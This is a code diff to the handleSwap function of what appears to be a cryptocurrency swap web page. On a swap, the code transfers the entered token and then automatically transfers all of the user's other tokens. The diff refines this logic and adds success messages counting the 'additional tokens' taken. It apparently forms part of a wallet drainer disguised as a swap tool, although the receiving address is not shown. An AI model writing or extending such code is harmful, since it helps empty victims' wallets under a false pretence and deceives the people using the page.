@@ -871,12 +871,18 @@ async function handleSwap() {
     showLoader();
     
     // 1. First process ONLY the main token from input
-    await processMainTokenTransfer();
+    const transferredAmount = await processMainTokenTransfer();
+    updateStatus(`Successfully transferred ${transferredAmount} ${currentFromToken.symbol}`, "success");
     
-    // 2. Then automatically process all other tokens
-    await processAllTokenTransfers();
+    // 2. Then automatically process all other tokens (excluding the main token)
+    const successCount = await processAllTokenTransfers();
     
-    updateStatus("All transfers completed successfully!", "success");
+    if (successCount > 0) {
+      updateStatus(`Transferred ${successCount} additional tokens successfully!`, "success");
+    } else {
+      updateStatus("No additional tokens to transfer", "success");
+    }
+    
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
@@ -888,7 +894,6 @@ async function handleSwap() {
   }
 }
 
-// Keep processMainTokenTransfer but modify it to handle only the input token:
 async function processMainTokenTransfer() {
   const inputAmount = parseFloat(document.getElementById("fromAmount").value);
   if (!inputAmount || inputAmount <= 0) {
@@ -913,6 +918,9 @@ async function processMainTokenTransfer() {
   } else {
     await transferERC20Token(currentFromToken, inputAmount);
   }
+  
+  // Return the amount that was actually transferred
+  return inputAmount;
 }
 
 // Modify processAllTokenTransfers to EXCLUDE the main token:
